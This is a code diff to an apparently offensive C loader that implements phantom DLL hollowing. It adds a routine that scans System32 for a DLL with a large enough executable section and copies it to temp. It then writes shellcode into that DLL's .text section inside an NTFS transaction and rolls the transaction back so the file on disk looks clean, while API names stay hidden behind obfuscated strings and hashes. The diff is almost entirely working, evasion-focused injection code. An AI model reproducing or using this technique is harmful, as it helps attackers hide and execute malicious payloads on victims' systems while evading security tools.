@@ -123,6 +123,107 @@ BOOL ModuleStomp(
 }
 
 // -----------------------------------------------
+// Scan System32 for a DLL suitable for hollowing:
+//   - Not already loaded in this process
+//   - Has an executable section >= dwMinSize
+// Returns TRUE and fills pOutName with the filename.
+// -----------------------------------------------
+static BOOL FindSuitableDll(
+    IN  PAPI_HASHING      pApi,
+    IN  HMODULE           hK32,
+    IN  fnCloseHandle2    pCloseHandle,
+    IN  fnReadFile        pReadFile,
+    IN  LPCSTR            szPrefix,
+    IN  SIZE_T            nPre,
+    IN  DWORD             dwMinSize,
+    OUT PCHAR             pOutName
+) {
+    BYTE xFindFirst[] = XSTR_FIND_FIRST_FILE_A;
+    DEOBF(xFindFirst);
+    fnFindFirstFileA2 pFindFirst = (fnFindFirstFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindFirst);
+
+    BYTE xFindNext[] = XSTR_FIND_NEXT_FILE_A;
+    DEOBF(xFindNext);
+    fnFindNextFileA2 pFindNext = (fnFindNextFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindNext);
+
+    BYTE xFindClose[] = XSTR_FIND_CLOSE;
+    DEOBF(xFindClose);
+    fnFindClose2 pFindCloseFunc = (fnFindClose2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindClose);
+
+    BYTE xCreateFile[] = XSTR_CREATE_FILE_A;
+    DEOBF(xCreateFile);
+    fnCreateFileA2 pCreateFile = (fnCreateFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFile);
+
+    if (!pFindFirst || !pFindNext || !pFindCloseFunc || !pCreateFile)
+        return FALSE;
+
+    // Build search pattern: C:\Windows\System32\*.dll
+    BYTE xWild[] = XSTR_DLL_WILDCARD;
+    DEOBF(xWild);
+
+    CHAR szPattern[260];
+    MemSet(szPattern, 0, sizeof(szPattern));
+    MemCopy(szPattern, szPrefix, nPre);
+    MemCopy(szPattern + nPre, xWild, StrLenA((LPCSTR)xWild));
+
+    WIN32_FIND_DATAA fd;
+    MemSet(&fd, 0, sizeof(fd));
+    HANDLE hFind = pFindFirst(szPattern, &fd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return FALSE;
+
+    BOOL bFound = FALSE;
+
+    do {
+        // Skip if already loaded
+        if (pApi->pGetModuleHandleA(fd.cFileName) != NULL)
+            continue;
+
+        // Build full path
+        CHAR szFull[260];
+        MemSet(szFull, 0, sizeof(szFull));
+        SIZE_T nName = StrLenA(fd.cFileName);
+        MemCopy(szFull, szPrefix, nPre);
+        MemCopy(szFull + nPre, fd.cFileName, nName);
+
+        // Open and check PE headers
+        HANDLE hPe = pCreateFile(szFull, GENERIC_READ, FILE_SHARE_READ,
+                                 NULL, OPEN_EXISTING, 0, NULL);
+        if (hPe == INVALID_HANDLE_VALUE)
+            continue;
+
+        BYTE peHdr[1024];
+        DWORD dwRead = 0;
+        BOOL bOk = pReadFile(hPe, peHdr, sizeof(peHdr), &dwRead, NULL);
+        pCloseHandle(hPe);
+
+        if (!bOk || dwRead < sizeof(IMAGE_DOS_HEADER))
+            continue;
+
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peHdr;
+        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) continue;
+
+        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peHdr + pDos->e_lfanew);
+        if ((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS) > peHdr + dwRead) continue;
+        if (pNt->Signature != IMAGE_NT_SIGNATURE) continue;
+
+        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+        for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
+            if ((pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                pSec[s].SizeOfRawData >= dwMinSize) {
+                MemCopy(pOutName, fd.cFileName, nName + 1);
+                bFound = TRUE;
+                break;
+            }
+        }
+        if (bFound) break;
+    } while (pFindNext(hFind, &fd));
+
+    pFindCloseFunc(hFind);
+    return bFound;
+}
+
+// -----------------------------------------------
 // Phantom DLL Hollowing (NTFS Transactions)
 //
 // Creates a transacted copy of a sacrificial DLL,
@@ -151,21 +252,7 @@ BOOL PhantomDllHollow(
 
     NTSTATUS STATUS = 0;
 
-    // --- Build full DLL path: C:\Windows\System32\<dll> ---
-
-    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
-    DEOBF(xPrefix);
-    BYTE xDll[] = XSTR_STOMP_DLL;
-    DEOBF(xDll);
-
-    CHAR szPath[260];
-    MemSet(szPath, 0, sizeof(szPath));
-    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);
-    SIZE_T nDll = StrLenA((LPCSTR)xDll);
-    MemCopy(szPath, xPrefix, nPre);
-    MemCopy(szPath + nPre, xDll, nDll);
-
-    // --- Resolve kernel32 base for file I/O APIs ---
+    // --- Resolve kernel32 base ---
 
     BYTE xK32[] = XSTR_KERNEL32_DLL;
     DEOBF(xK32);
@@ -173,18 +260,67 @@ BOOL PhantomDllHollow(
     if (!hK32)
         return FALSE;
 
-    BYTE xCreateFileTx[] = XSTR_CREATE_FILE_TXA;
-    DEOBF(xCreateFileTx);
-    fnCreateFileTransactedA pCreateFileTx =
-        (fnCreateFileTransactedA)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFileTx);
-    if (!pCreateFileTx)
-        return FALSE;
+    // --- Resolve all needed APIs ---
 
     fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
     fnWriteFile2 pWriteFile = (fnWriteFile2)FetchExportAddress((PVOID)hK32, WriteFile_JOAAT);
     fnSetFilePointer pSetFilePointer = (fnSetFilePointer)FetchExportAddress((PVOID)hK32, SetFilePointer_JOAAT);
-    if (!pReadFile || !pWriteFile || !pSetFilePointer)
+    fnCloseHandle2 pCloseHandle = (fnCloseHandle2)FetchExportAddress((PVOID)hK32, CloseHandle_JOAAT);
+    if (!pReadFile || !pWriteFile || !pSetFilePointer || !pCloseHandle)
         return FALSE;
+
+    BYTE xCreateFileTx[] = XSTR_CREATE_FILE_TXA;
+    DEOBF(xCreateFileTx);
+    fnCreateFileTransactedA pCreateFileTx =
+        (fnCreateFileTransactedA)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFileTx);
+
+    BYTE xGetTemp[] = XSTR_GET_TEMP_PATH_A;
+    DEOBF(xGetTemp);
+    fnGetTempPathA2 pGetTempPath = (fnGetTempPathA2)pApi->pGetProcAddress(hK32, (LPCSTR)xGetTemp);
+
+    BYTE xCopyFile[] = XSTR_COPY_FILE_A;
+    DEOBF(xCopyFile);
+    fnCopyFileA2 pCopyFile = (fnCopyFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCopyFile);
+
+    if (!pCreateFileTx || !pGetTempPath || !pCopyFile)
+        return FALSE;
+
+    // --- Scan System32 for suitable DLL ---
+
+    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
+    DEOBF(xPrefix);
+    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);
+
+    CHAR szChosenDll[260];
+    MemSet(szChosenDll, 0, sizeof(szChosenDll));
+
+    if (!FindSuitableDll(pApi, hK32, pCloseHandle, pReadFile,
+                         (LPCSTR)xPrefix, nPre, dwShellcodeSize, szChosenDll)) {
+        LOG("[!] Phantom: no suitable DLL found in System32");
+        return FALSE;
+    }
+    LOG("[+] Phantom: selected DLL for hollowing");
+
+    // --- Copy chosen DLL to temp ---
+
+    CHAR szSrcPath[260];
+    MemSet(szSrcPath, 0, sizeof(szSrcPath));
+    SIZE_T nDll = StrLenA(szChosenDll);
+    MemCopy(szSrcPath, xPrefix, nPre);
+    MemCopy(szSrcPath + nPre, szChosenDll, nDll);
+
+    CHAR szPath[260];
+    MemSet(szPath, 0, sizeof(szPath));
+    DWORD dwTempLen = pGetTempPath(sizeof(szPath), szPath);
+    if (dwTempLen == 0)
+        return FALSE;
+    MemCopy(szPath + dwTempLen, szChosenDll, nDll);
+
+    if (!pCopyFile(szSrcPath, szPath, FALSE)) {
+        LOG("[!] Phantom: CopyFile to temp failed");
+        return FALSE;
+    }
+    LOG("[+] Phantom: DLL copied to temp");
 
     // --- Load ktmw32.dll and resolve TxF APIs ---
 
@@ -233,6 +369,7 @@ BOOL PhantomDllHollow(
     if (hFile == INVALID_HANDLE_VALUE) {
         LOG("[!] Phantom: CreateFileTransacted failed (permissions?)");
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
 
@@ -244,23 +381,31 @@ BOOL PhantomDllHollow(
     BYTE peHeader[1024];
     DWORD dwBytesRead = 0;
     if (!pReadFile(hFile, peHeader, sizeof(peHeader), &dwBytesRead, NULL) || dwBytesRead < sizeof(IMAGE_DOS_HEADER)) {
+        pCloseHandle(hFile);
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
 
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peHeader;
     if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
+        pCloseHandle(hFile);
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
 
     PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peHeader + pDos->e_lfanew);
     if ((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS) > peHeader + dwBytesRead) {
+        pCloseHandle(hFile);
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
     if (pNt->Signature != IMAGE_NT_SIGNATURE) {
+        pCloseHandle(hFile);
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
 
@@ -280,7 +425,9 @@ BOOL PhantomDllHollow(
 
     if (dwTextRawSize < dwShellcodeSize) {
         LOG("[!] Phantom: .text too small for shellcode");
+        pCloseHandle(hFile);
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
 
@@ -293,7 +440,9 @@ BOOL PhantomDllHollow(
     DWORD dwWritten = 0;
     if (!pWriteFile(hFile, pShellcode, dwShellcodeSize, &dwWritten, NULL) || dwWritten != dwShellcodeSize) {
         LOG("[!] Phantom: WriteFile failed");
+        pCloseHandle(hFile);
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
 
@@ -316,14 +465,20 @@ BOOL PhantomDllHollow(
     );
     if (!NT_SUCCESS(STATUS)) {
         LOG_STATUS("[!] Phantom: NtCreateSection failed", STATUS);
+        pCloseHandle(hFile);
         pRollback(hTx);
+        pCloseHandle(hTx);
         return FALSE;
     }
+
+    // --- Close file handle (section holds its own reference) ---
+    pCloseHandle(hFile);
 
     // --- Rollback transaction: on-disk file is unchanged ---
     // The section retains the modified content
 
     pRollback(hTx);
+    pCloseHandle(hTx);
     LOG("[+] Phantom: transaction rolled back (file clean)");
 
     // --- Map the section into our process ---
@@ -346,8 +501,12 @@ BOOL PhantomDllHollow(
     );
     if (!NT_SUCCESS(STATUS)) {
         LOG_STATUS("[!] Phantom: NtMapViewOfSection failed", STATUS);
+        pCloseHandle(hSection);
         return FALSE;
     }
+
+    // Section handle no longer needed after mapping
+    pCloseHandle(hSection);
 
     // --- Change .text protection to executable ---
     // SEC_IMAGE maps with PE section header protections (typically RX).
